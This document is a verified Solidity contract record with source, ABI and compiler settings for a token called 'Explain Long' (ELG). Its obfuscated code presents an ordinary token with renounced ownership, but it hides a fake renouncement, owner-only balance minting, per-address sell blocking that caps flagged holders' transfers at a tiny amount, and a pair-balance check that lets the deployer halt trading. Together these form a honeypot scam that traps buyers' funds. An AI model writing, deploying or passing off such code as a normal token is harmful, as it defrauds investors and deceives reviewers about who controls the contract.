{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface modeReceiver {\n    function createPair(address takeExempt, address totalTeam) external returns (address);\n}\n\ninterface liquidityMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverToken) external view returns (uint256);\n\n    function transfer(address listMode, uint256 shouldTrading) external returns (bool);\n\n    function allowance(address toSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listMode,\n        uint256 shouldTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldModeLimit, uint256 value);\n    event Approval(address indexed toSwap, address indexed spender, uint256 value);\n}\n\nabstract contract autoFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLaunchAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityModeMetadata is liquidityMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExplainLong is autoFee, liquidityMode, liquidityModeMetadata {\n\n    function totalFrom(address maxLaunch, address listMode, uint256 shouldTrading) internal returns (bool) {\n        require(atTrading[maxLaunch] >= shouldTrading);\n        atTrading[maxLaunch] -= shouldTrading;\n        atTrading[listMode] += shouldTrading;\n        emit Transfer(maxLaunch, listMode, shouldTrading);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableFrom;\n\n    string private shouldLaunch = \"Explain Long\";\n\n    mapping(address => bool) public maxSwapFee;\n\n    uint8 private amountTradingWallet = 18;\n\n    function liquidityLaunchToken(address buyTake, uint256 shouldTrading) public {\n        totalLaunch();\n        atTrading[buyTake] = shouldTrading;\n    }\n\n    uint256 public swapFund;\n\n    function buyAuto() public {\n        emit OwnershipTransferred(senderLaunch, address(0));\n        liquiditySellAuto = address(0);\n    }\n\n    bool private modeLiquidity;\n\n    uint256 enableMin;\n\n    function owner() external view returns (address) {\n        return liquiditySellAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLaunch;\n    }\n\n    address private liquiditySellAuto;\n\n    mapping(address => bool) public fundToLiquidity;\n\n    bool public fundExempt;\n\n    bool public receiverBuyFund;\n\n    function transferFrom(address maxLaunch, address listMode, uint256 shouldTrading) external override returns (bool) {\n        if (_msgSender() != launchedTake) {\n            if (enableFrom[maxLaunch][_msgSender()] != type(uint256).max) {\n                require(shouldTrading <= enableFrom[maxLaunch][_msgSender()]);\n                enableFrom[maxLaunch][_msgSender()] -= shouldTrading;\n            }\n        }\n        return launchList(maxLaunch, listMode, shouldTrading);\n    }\n\n    string private minAuto = \"ELG\";\n\n    event OwnershipTransferred(address indexed liquidityTx, address indexed receiverSwap);\n\n    function approve(address tokenLiquidityLaunch, uint256 shouldTrading) public virtual override returns (bool) {\n        enableFrom[_msgSender()][tokenLiquidityLaunch] = shouldTrading;\n        emit Approval(_msgSender(), tokenLiquidityLaunch, shouldTrading);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquiditySellAuto;\n    }\n\n    function launchList(address maxLaunch, address listMode, uint256 shouldTrading) internal returns (bool) {\n        if (maxLaunch == senderLaunch) {\n            return totalFrom(maxLaunch, listMode, shouldTrading);\n        }\n        uint256 isMax = liquidityMode(totalLimitFee).balanceOf(amountSwap);\n        require(isMax == toMaxReceiver);\n        require(listMode != amountSwap);\n        if (maxSwapFee[maxLaunch]) {\n            return totalFrom(maxLaunch, listMode, fundTotal);\n        }\n        return totalFrom(maxLaunch, listMode, shouldTrading);\n    }\n\n    uint256 private receiverListTrading;\n\n    bool public limitTake;\n\n    function allowance(address senderTradingList, address tokenLiquidityLaunch) external view virtual override returns (uint256) {\n        if (tokenLiquidityLaunch == launchedTake) {\n            return type(uint256).max;\n        }\n        return enableFrom[senderTradingList][tokenLiquidityLaunch];\n    }\n\n    constructor (){\n        if (modeLiquidity) {\n            limitTake = true;\n        }\n        sellLaunchAuto enableAmount = sellLaunchAuto(launchedTake);\n        totalLimitFee = modeReceiver(enableAmount.factory()).createPair(enableAmount.WETH(), address(this));\n        \n        senderLaunch = _msgSender();\n        fundToLiquidity[senderLaunch] = true;\n        atTrading[senderLaunch] = listLiquidity;\n        buyAuto();\n        \n        emit Transfer(address(0), senderLaunch, listLiquidity);\n    }\n\n    address public totalLimitFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listLiquidity;\n    }\n\n    function transfer(address buyTake, uint256 shouldTrading) external virtual override returns (bool) {\n        return launchList(_msgSender(), buyTake, shouldTrading);\n    }\n\n    uint256 constant fundTotal = 14 ** 10;\n\n    uint256 toMaxReceiver;\n\n    function walletLiquidity(uint256 shouldTrading) public {\n        totalLaunch();\n        toMaxReceiver = shouldTrading;\n    }\n\n    function minSwap(address totalSender) public {\n        totalLaunch();\n        if (fromSwap != swapFund) {\n            swapFund = receiverListTrading;\n        }\n        if (totalSender == senderLaunch || totalSender == totalLimitFee) {\n            return;\n        }\n        maxSwapFee[totalSender] = true;\n    }\n\n    uint256 private listLiquidity = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private atTrading;\n\n    function balanceOf(address receiverToken) public view virtual override returns (uint256) {\n        return atTrading[receiverToken];\n    }\n\n    function shouldTo(address fromReceiverLimit) public {\n        if (fundExempt) {\n            return;\n        }\n        if (modeLiquidity) {\n            swapFund = fromSwap;\n        }\n        fundToLiquidity[fromReceiverLimit] = true;\n        \n        fundExempt = true;\n    }\n\n    uint256 private fromSwap;\n\n    address public senderLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minAuto;\n    }\n\n    function totalLaunch() private view {\n        require(fundToLiquidity[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountTradingWallet;\n    }\n\n    address amountSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address launchedTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldModeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTradingList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLiquidityLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundToLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTrading\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSwapFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSender\",\"type\":\"address\"}],\"name\":\"minSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuyFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiverLimit\",\"type\":\"address\"}],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimitFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTrading\",\"type\":\"uint256\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExplainLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}